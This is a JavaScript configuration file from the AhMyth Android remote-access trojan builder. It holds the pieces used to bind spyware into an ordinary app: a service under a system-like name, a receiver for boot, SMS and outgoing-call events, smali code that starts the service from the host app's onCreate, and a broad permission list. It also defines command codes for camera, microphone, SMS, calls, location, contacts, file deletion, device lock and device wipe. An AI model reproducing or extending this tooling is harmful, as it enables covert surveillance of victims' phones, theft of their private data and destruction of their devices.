var path = require("path");


//---------------------App Controller Vars----------------------------------
exports.apkName = 'Ahmyth.apk';
exports.signedApkName = 'Ahmyth-aligned-debugSigned.apk';
exports.ahmythApkFolderPath = path.join(__dirname, '..', '..', 'Factory/Ahmyth').replace("app.asar", "app.asar.unpacked");
exports.apktoolJar = path.join(__dirname, '..', '..', 'Factory/apktool.jar').replace("app.asar", "app.asar.unpacked");
exports.signApkJar = path.join(__dirname, '..', '..', 'Factory/uber-apk-signer.jar').replace("app.asar", "app.asar.unpacked");;
exports.dataDir = 'AhMyth'
exports.downloadPath = 'Downloads';
exports.outputApkPath = 'Output';
exports.logColors = { RED: "red", GREEN: "green", DEFAULT: "white" };
exports.logStatus = { SUCCESS: 1, FAIL: 0 };
exports.defaultPort = 42474;
exports.IOSocketPath = 'smali/b1/b.smali';
exports.ahmythService = '<service android:enabled="true" android:exported="true" android:name="com.android.background.services.MainService"/>';
exports.ahmythReciver = '<receiver android:enabled="true" android:exported="true" android:name="com.android.background.services.receivers.MyReceiver">' +
    '<intent-filter>' +
    '<action android:name="android.intent.action.BOOT_COMPLETED"/>' +
    '</intent-filter>' +
    '<intent-filter android:priority="9999">' +
    '<action android:name="android.provider.Telephony.SMS_RECEIVED" />' +
    '</intent-filter>' +
    '<intent-filter>' +
    '<action android:name="android.intent.action.QUICKBOOT_POWERON"/>' +
    '</intent-filter>' +
    '<intent-filter android:priority="5822">' +
    '<action android:name="android.intent.action.NEW_OUTGOING_CALL"/>' +
    '</intent-filter>' +
    '</receiver>';
exports.serviceSrc = '\n\n    new-instance v0, Landroid/content/Intent;' +
    '\n\n' +
    '    const-class v1, Lahmyth/mine/king/ahmyth/services/MainService;' +
    '\n\n' +
    '    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V' +
    '\n\n' +
    '    invoke-virtual {p0, v0}, L';
exports.serviceStart = ';->startService(Landroid/content/Intent;)Landroid/content/ComponentName;';
exports.orgAppKey = ';->onCreate(Landroid/os/Bundle;)V';
exports.permissions = [
    '<uses-permission android:name="android.permission.WAKE_LOCK" />',
    '<uses-permission android:name="android.permission.CAMERA" />',
    '<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />',
    '<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />',
    '<uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" tools:ignore="ScopedStorage" />',
    '<uses-permission android:name="android.permission.INTERNET" />',
    '<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />',
    '<uses-permission android:name="android.permission.READ_SMS"/>',
    '<uses-permission android:name="android.permission.SEND_SMS"/>',
    '<uses-permission android:name="android.permission.RECEIVE_SMS"/>',
    '<uses-permission android:name="android.permission.WRITE_SMS" />',
    '<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>',
    '<uses-permission android:name="android.permission.READ_PHONE_STATE" />',
    '<uses-permission android:name="android.permission.READ_CALL_LOG"/>',
    '<uses-permission android:name="android.permission.READ_PHONE_STATE"/>',
    '<uses-permission android:name="android.permission.CALL_PHONE"/>',
    '<uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />',
    '<uses-permission android:name="android.permission.READ_CONTACTS" />',
    '<uses-permission android:name="android.permission.RECORD_AUDIO"/>',
    '<uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>',
    '<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />',
    '<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>',
    '<uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>',
    '<uses-permission android:name="android.permission.FOREGROUND_SERVICE" />',
]



//---------------------Lab Controller Vars----------------------------------
exports.order = 'order';
exports.orders = {
    camera: 'x0000ca',
    fileManager: 'x0000fm',
    calls: 'x0000cl',
    sms: 'x0000sm',
    images: 'x0000getAllImages',
    mic: 'x0000mc',
    location: 'x0000lm',
    contacts: 'x0000cn',
    apps: 'x0000apps',
    runApp: 'x0000runApp',
    openUrl: 'x0000openUrl',
    deleteFileFolder: 'x0000deleteFF',
    dialNumber: 'x0000dm',
    lockDevice: 'x0000lockDevice',
    wipeDevice: 'x0000wipeDevice',
    rebootDevice: 'x0000rebootDevice',
    listenMicrophone: 'x0000listenMic',
}